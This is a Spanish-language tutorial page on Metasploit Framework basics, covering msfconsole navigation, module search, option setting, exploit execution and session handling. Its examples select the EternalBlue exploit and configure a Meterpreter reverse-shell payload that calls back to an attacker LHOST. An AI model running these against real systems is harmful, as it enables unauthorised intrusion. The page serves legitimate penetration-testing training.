---
icon: building-magnifying-glass
---

# Metasploit Framework

## Metasploit Framework — Introducción y MSFconsole

### ¿Qué es Metasploit?

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

**Metasploit Framework** es el framework de explotación de código abierto más utilizado en el sector. Desarrollado por Rapid7, centraliza en una sola plataforma el proceso de enumeración, explotación, generación de payloads y post-explotación. Es la herramienta de referencia en certificaciones como OSCP, eCPPT y CPTS.

Metasploit no es solo para explotar vulnerabilidades — también sirve para escaneo, enumeración, generación de payloads personalizados y automatización de tareas repetitivas de pentesting.

### Arquitectura de Metasploit

```
Framework Core
      │
      ├── Módulos (exploits, auxiliares, post, payloads, encoders, nops)
      ├── Librerías (Rex, MSF Core, MSF Base)
      ├── Plugins (extensiones de funcionalidad)
      └── Interfaces (msfconsole, msfvenom, RPC API)
```

#### Directorio de instalación

```bash
# En Kali Linux
ls /usr/share/metasploit-framework/

modules/      # todos los módulos
plugins/      # plugins cargables
scripts/      # scripts de Meterpreter y otros
tools/        # herramientas auxiliares
data/         # wordlists, binarios, plantillas
```

### MSFconsole — La interfaz principal

MSFconsole es la interfaz interactiva de Metasploit. Es una consola completa con historial, autocompletado con Tab y soporte para ejecutar comandos del sistema operativo directamente.

```bash
# Iniciar Metasploit
sudo msfconsole

# Iniciar silenciosamente (sin banner)
sudo msfconsole -q
```

#### Comandos esenciales de MSFconsole

**Navegación y búsqueda**

```bash
# Buscar módulos
search eternalblue
search type:exploit platform:windows smb
search cve:2021-34527
search name:psexec

# Filtros de búsqueda disponibles:
# type:        exploit, auxiliary, post, payload, encoder
# platform:    windows, linux, unix, android, osx
# arch:        x86, x64, mipsbe, armle
# rank:        excellent, great, good, normal, average, low
# cve:         número de CVE
# name:        nombre del módulo

# Ver información detallada de un módulo
info exploit/windows/smb/ms17_010_eternalblue
info 0  # por número del resultado de search

# Seleccionar un módulo
use exploit/windows/smb/ms17_010_eternalblue
use 0   # por número en la lista de search

# Volver atrás
back

# Mostrar el módulo activo
show
```

**Configuración de módulos**

```bash
# Ver todas las opciones del módulo
options
show options

# Ver opciones avanzadas
advanced
show advanced

# Configurar una opción
set RHOSTS 10.10.10.10
set LHOST 10.10.14.5
set LPORT 443
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Configurar opción globalmente (para todos los módulos)
setg LHOST 10.10.14.5
setg LPORT 443

# Ver el valor actual de una opción
get RHOSTS

# Desactivar una opción
unset RHOSTS
unsetg LHOST

# Guardar la configuración actual
save
```

**Ejecución**

```bash
# Ejecutar el módulo
exploit
run

# Ejecutar en background como job
exploit -j
run -j

# Verificar si el objetivo es vulnerable sin explotar (si el módulo lo soporta)
check
```

**Gestión de sesiones y jobs**

```bash
# Listar sesiones activas
sessions
sessions -l

# Interactuar con una sesión
sessions -i 1

# Matar una sesión
sessions -k 1
sessions -K   # matar todas

# Ver jobs en background
jobs
jobs -l

# Matar un job
jobs -k 1

# Poner sesión actual en background (desde dentro de Meterpreter)
background
# o Ctrl+Z
```

**Comandos del sistema desde MSFconsole**

```bash
# Ejecutar comandos del SO directamente
shell
!ls
!pwd
!cat /etc/hosts

# Historico de comandos
history

# Limpiar la pantalla
clear

# Salir
exit
quit
```

### Estructura de navegación en MSFconsole

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

El prompt cambia según el contexto:

```
msf6 >                                    # Sin módulo seleccionado
msf6 exploit(windows/smb/ms17_010) >     # Módulo exploit seleccionado
msf6 auxiliary(scanner/smb/smb_ms17) >   # Módulo auxiliary seleccionado
meterpreter >                             # Dentro de una sesión Meterpreter
```

### Actualizar Metasploit

```bash
# Actualizar desde Kali
sudo apt update && sudo apt install metasploit-framework

# Actualizar desde dentro de msfconsole (método antiguo)
msf6 > msfupdate
```

> MSFconsole tiene autocompletado con Tab en todos los comandos, rutas de módulos y opciones. Usarlo activamente ahorra mucho tiempo y evita errores tipográficos.

> Usar `setg` para configurar LHOST y LPORT globalmente al inicio de una sesión de trabajo evita tener que configurarlos en cada módulo individualmente.
